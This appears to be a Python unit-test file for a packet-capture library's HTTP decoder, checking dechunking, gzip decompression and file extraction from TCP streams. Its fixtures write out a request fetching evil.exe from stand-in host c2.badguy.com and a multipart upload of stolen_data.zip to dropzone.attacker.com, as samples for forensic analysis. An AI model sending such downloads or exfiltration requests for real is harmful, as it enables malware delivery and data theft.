import gzip
import unittest

from pcap_decode.models import FlowKey, TcpStream
from pcap_decode.protocols.http import HttpDecoder, dechunk_http_body, decompress_payload


class TestHttpDecoder(unittest.TestCase):
    def test_dechunk(self):
        chunked_data = b"4\r\nWiki\r\n5\r\npedia\r\nf\r\n in \r\n\r\nchunks.\r\n0\r\n\r\n"
        dechunked = dechunk_http_body(chunked_data)
        self.assertEqual(dechunked, b"Wikipedia in \r\n\r\nchunks.")

    def test_decompress_gzip(self):
        original = b"Malicious payload script content"
        compressed = gzip.compress(original)
        decompressed = decompress_payload(compressed, "gzip")
        self.assertEqual(decompressed, original)

    def test_http_download_extraction(self):
        decoder = HttpDecoder()
        stream = TcpStream(
            flow=FlowKey("192.168.1.10", 49152, "93.184.216.34", 80),
            start_time=100.0,
            end_time=101.0,
            client_to_server=b"GET /payloads/evil.exe HTTP/1.1\r\nHost: c2.badguy.com\r\nUser-Agent: curl/7.68.0\r\n\r\n",
            server_to_client=b"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: 10\r\n\r\nMZ\x90\x00\x03\x00\x00\x00\x04\x00",
        )

        extracted = decoder.parse_stream(stream)
        self.assertEqual(len(extracted), 1)
        item = extracted[0]
        self.assertEqual(item["filename"], "evil.exe")
        self.assertEqual(item["data"], b"MZ\x90\x00\x03\x00\x00\x00\x04\x00")
        self.assertEqual(item["source_protocol"], "HTTP")
        self.assertEqual(item["metadata"]["host"], "c2.badguy.com")
        self.assertEqual(item["metadata"]["status_code"], 200)

    def test_http_multipart_upload_extraction(self):
        decoder = HttpDecoder()
        boundary = "---------------------------974767299852498929531610575"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="stolen_data.zip"\r\n'
            f"Content-Type: application/zip\r\n\r\n"
            f"PK\x03\x04testpayload\r\n"
            f"--{boundary}--\r\n"
        ).encode("latin1")

        req = (
            f"POST /upload HTTP/1.1\r\n"
            f"Host: dropzone.attacker.com\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {len(body)}\r\n\r\n"
        ).encode("latin1") + body

        stream = TcpStream(
            flow=FlowKey("192.168.1.10", 49152, "198.51.100.22", 80),
            start_time=100.0,
            end_time=101.0,
            client_to_server=req,
            server_to_client=b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK",
        )

        extracted = decoder.parse_stream(stream)
        self.assertTrue(any(item["filename"] == "stolen_data.zip" for item in extracted))


if __name__ == "__main__":
    unittest.main()
